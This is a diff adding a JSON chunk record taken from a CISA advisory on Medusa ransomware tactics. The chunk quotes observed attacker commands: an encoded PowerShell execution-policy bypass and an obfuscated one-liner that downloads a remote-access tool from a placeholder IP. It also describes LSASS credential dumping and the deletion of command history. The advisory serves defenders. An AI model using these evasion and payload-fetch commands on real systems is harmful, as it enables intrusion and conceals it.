@@ -1,0 +1,33 @@
+{
+  "chunk": {
+    "chunk_id": "AA25-071A:evaluation:llama500:8653:10741",
+    "doc_id": "AA25-071A",
+    "start": 8653,
+    "end": 10741,
+    "text": " include:\n21 (FTP)\n22 (SSH)\n23 (Telnet)\n80 (HTTP)\n115 (SFTP)\n443 (HTTPS)\n1433 (SQL database)\n3050 (Firebird database)\n3128 (HTTP web proxy)\n3306 (MySQL database)\n3389 (RDP)\nMedusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105]. Medusa actors use Windows Management Instrumentation (WMI) [T1047] for querying system information.\nStealth\nMedusa actors exploit legitimate tools and use LOTL techniques to avoid detection. (See Appendix: Medusa Commands for associated shell commands observed during FBI investigations of Medusa victims.) Certutil (certutil.exe), an administrator utility used to manage public key infrastructure (PKI) and download files, is used to avoid detection when performing file ingress.\n(Updated Aug. 18, 2026) Medusa actors also use Minidump (comsvcs.dll) to avoid detection when dumping Local Security Authority Subsystem Service (LSASS) credentials.\nMedusa actors use several different PowerShell stealth techniques with increasing complexity; these are provided below. Additionally, Medusa actors attempt to cover their tracks by deleting the PowerShell command line history [T1070.003].\nIn this example, Medusa actors use a well-known stealth technique that executes a base64 encrypted command [T1027.013] using specific execution settings.\npowershell -exec bypass -enc <base64 encrypted command string>\nIn another example, the DownloadFile string is obfuscated by slicing it into pieces and referencing it via a variable [T1027].\npowershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New-Object Net.WebClient).$x.Invoke(http://<ip>/<RAS tool>.msi)\nIn the final example, the payload is an obfuscated base64 string read into memory, decompressed from gzip, and used to create a scriptblock. The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.\n",
+    "inherited_context": [
+      {
+        "start": 23,
+        "end": 57,
+        "text": "#StopRansomware: Medusa Ransomware"
+      },
+      {
+        "start": 4834,
+        "end": 4851,
+        "text": "Technical Details"
+      }
+    ],
+    "role": "extraction",
+    "parent_extraction_chunk_id": null,
+    "embedding": null
+  },
+  "source_tokens": 490,
+  "inherited_context_tokens": 14,
+  "overlap_with_previous_tokens": 60,
+  "terminal_reanchored": false,
+  "short_section": false,
+  "source_text_sha256": "d9ad06d56ca3294b82574ef6a92342c2e09379b837401ec9f9199f41d6821f69",
+  "doc_id": "AA25-071A",
+  "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
+  "source_hash": "64d2dbc766932cad628d1314650ed6d79d1bd9a284640afa1fc9eb8bb4114e5e"
+}
